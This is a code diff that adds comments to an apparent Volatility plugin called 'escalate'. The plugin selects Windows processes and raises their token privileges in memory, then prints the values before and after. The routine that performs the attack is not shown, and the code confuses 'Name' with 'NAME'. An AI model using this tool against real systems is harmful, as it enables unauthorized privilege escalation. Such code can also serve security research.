@@ -114,7 +114,7 @@ class escalate(common.AbstractWindowsCommand):
         :return: The target process' name
         '''
 
-        # Get all processes and return name of process whose PID matches supplied PID
+        # Get all processes and return name of process whose PID matches PID supplied to this function
         for proc in win32.tasks.pslist(self._addrspace):
             if proc.UniqueProcessId.v() == pid:
                 return str(proc.ImageFileName)
@@ -126,10 +126,15 @@ class escalate(common.AbstractWindowsCommand):
         self._addrspace = utils.load_as(self._config)
         self.PRIV = int(self._config.PRIV, 16)
 
+        # If not escalating all active processes
         if not self._config.ALL:
+            # Parse input PIDs
             pid = self._config.PID.split(",") if self._config.PID is not None else [None]
+
+            # Parse input names
             name = self._config.NAME.split(",") if self._config.Name is not None else [None]
 
+            
             if pid == [None]:
                 pid = [self.get_pid_from_name(n) for n in name]
 
@@ -140,15 +145,20 @@ class escalate(common.AbstractWindowsCommand):
                 name = [self.get_name_from_pid(p) for p in pid]
 
         else:
+            # Get list all all active PIDs and process names
             pid = [proc.UniqueProcessId.v() for proc in win32.tasks.pslist(self._addrspace)]
             name = [self.get_name_from_pid(p) for p in pid]
 
+        # Get list of process data structures (from PIDs)
         self._proc = [self.get_target_proc(p) for p in pid]
 
+        # This list maintains the privileges of attacked processes before the attack is performed (for comparison)
         old_priv = [int(proc.get_token().Privileges.Enabled) for proc in self._proc]
 
+        # FUN!
         self.perform_atack()
 
+        # Write output
         outfd.write("{:20} {:10} {:20} {:20}\n".format("Name", "PID", "Before", "After"))
         for n, p, old_p, new_p in zip(name, pid, old_priv, self._proc):
             outfd.write("{:20} {:10} {:20} {:20}\n".format(n, str(p), hex(old_p), hex(new_p.get_token().Privileges.Enabled)))
